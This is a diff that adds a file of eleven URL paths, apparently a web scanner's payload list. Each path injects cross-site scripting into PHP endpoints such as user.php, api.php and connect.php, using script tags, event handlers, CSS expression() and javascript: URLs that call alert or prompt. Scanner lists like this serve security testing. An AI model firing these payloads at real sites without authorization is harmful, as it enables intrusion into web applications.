@@ -1,0 +1,11 @@
+/0_2/user.php?back_act=http://127.0.0.1%22style=x:expression(alert(42873))%3E
+/0_1/?%22onmouseover='prompt(42873)'bad=%22%3E
+/0_1/api.php?op=map&maptype=1&city=test%3Cscript%3Ealert%28/42873/%29%3C/script%3E
+/0_1/api.php?op=map&maptype=1&defaultcity=%e5%22;alert%28/42873/%29;//
+/0_1/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&api_key=%22%3E%3C/script%3E%3Cscript%3Ealert%28/42873/%29;%3C/script%3E
+/0_1/api.php?op=map&maptype=1&defaultcity=%E5%8C%97%E4%BA%AC&field=%29%3C/script%3E%3Cscript%3Ealert%2842873%29%3C/script%3E//
+/0_1/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
+/0_1/api.php?op=video_api&uid=1&snid=1&pc_hash=%3C/script%3E%3Cscript%3Ealert(/360/)%3C/script%3E//&do_complete=1
+/0_1/?callback=%3Cscript%3Eprompt(42873)%3C/script%3E
+/0_1/connect.php?receive=yes&mod=login&op=callback&referer=webscan%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
+/0_1/connect.php?receive=yes&mod=login&op=callback&referer=webscan%bf%5Cu0027.replace(/.%2b/,/javascript:alert(42873)/.source);//
